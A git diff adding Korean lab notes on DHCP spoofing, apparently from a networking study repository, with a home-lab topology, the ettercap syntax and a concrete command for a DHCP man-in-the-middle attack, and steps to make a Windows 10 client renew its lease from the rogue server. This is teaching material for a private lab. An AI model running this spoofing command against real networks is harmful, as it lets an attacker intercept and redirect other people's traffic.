@@ -190,6 +190,31 @@ windows 10  192.168.10.130  / c / 192.168.10.131 / 192.168.10.131
 
 ## windows 10
 ![](./img/DNSimg/17.png)<br>
+- 자동으로 IP받기<br>
 
 ![](./img/DNSimg/18.png)<br>
 
+## 예제 2. DHCP Server가 중간자 공격으로 Spoofing 당했을 경우
+
+```
+kali        192.168.10.134  / c / 192.168.10.131 / 192.168.10.134
+WS2022      192.168.10.131  / c / 192.168.10.134 / 192.168.10.134
+windows 10  자동
+```
+
+- 문법
+```
+sudo ettercap -T -M dhcp:<할당할 IP대역 / SM / DNS>
+```
+- 실행
+```
+sudo ettercap -T -M dhcp:192.168.10.221-254/255.255.255.0/192.168.10.134
+```
+
+- windows 2022 에서의 작업<br>
+DHCP Server의 임대 생성에 올라온 IP를 제거한다.<br>
+'pc이름'에서 우클릭 후 '모든 작업 다시 시작'을 실행한다.
+
+- windows 10 에서의 작업<br>
+환경설정에서 입력되어 있던 IP를 모두 '자동'으로 변경한다.<br>
+'ipconfig /release -> ipconfig /renew -> ipconfig /all' 을 순서대로 입력, 실행
